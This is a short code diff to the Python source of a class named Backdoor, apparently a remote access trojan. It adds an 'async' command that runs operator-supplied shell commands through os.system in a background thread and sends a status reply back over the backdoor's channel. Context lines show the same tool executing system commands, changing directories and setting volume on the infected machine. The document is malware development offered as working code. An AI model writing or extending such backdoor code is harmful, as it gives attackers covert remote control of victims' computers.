@@ -107,6 +107,14 @@ class Backdoor:
 		except:
 			return "[-] Check your command"
 
+	def execute_async(self, command):
+		try: 
+			cmd_thread = threading.Thread(target=os.system, args=(command,))
+			cmd_thread.start()
+			return "[+] Executing..."
+		except: 
+			return "[-] Something wrong"
+
 
 	def change_working_directory_to(self, path):
 		try:
@@ -231,6 +239,11 @@ class Backdoor:
 					except Exception as error:
 						print(error)
 						self.reliable_send("[-] Can't set volume")
+
+				elif command.split()[0] == "async":
+					command = command.replace("async", "").strip()
+					res = self.execute_async(command)
+					self.reliable_send(res)
 
 				else:
 					res = self.execute_system_command(command)
